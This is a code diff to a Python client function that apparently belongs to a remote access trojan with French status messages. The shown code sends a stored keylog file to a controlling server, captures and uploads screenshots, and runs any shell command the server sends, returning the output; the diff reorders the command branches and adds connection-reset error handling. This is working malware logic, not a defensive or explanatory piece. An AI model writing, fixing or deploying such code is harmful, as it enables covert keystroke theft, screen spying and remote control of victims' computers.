@@ -56,10 +56,6 @@ def connect_to_server():
                     cs.send(keylog_content.encode())
                 except FileNotFoundError:
                     cs.send(b"Keylog file not found.")
-            else:
-                result = subprocess.run(command, shell=True, capture_output=True, text=True)
-                output = result.stdout + result.stderr
-                cs.send(output.encode())
             elif command.lower() == 'screenshot':
                 screenshot = pyautogui.screenshot()
                 buffer = io.BytesIO()
@@ -71,13 +67,19 @@ def connect_to_server():
 
                 cs.sendall(buffer.getvalue())
                 continue
-            result = subprocess.run(command, shell=True, capture_output=True, text=True)
+            else:
+                result = subprocess.run(command, shell=True, capture_output=True, text=True)
 
-            output = result.stdout + result.stderr
-            if not output:
-                output = "Commande executée, pas de sortie !."
-            cs.send(output.encode())
+                output = result.stdout + result.stderr
+                if not output:
+                    output = "Commande executée, pas de sortie !."
+                cs.send(output.encode())
+
+        except ConnectionResetError:
+            print("La connexion avec le serveur a été réinitialisée.")
+            break
         except Exception as e:
+            print(f"Erreur : {e}")
             cs.send(f"Error: {e}".encode())
             break
 
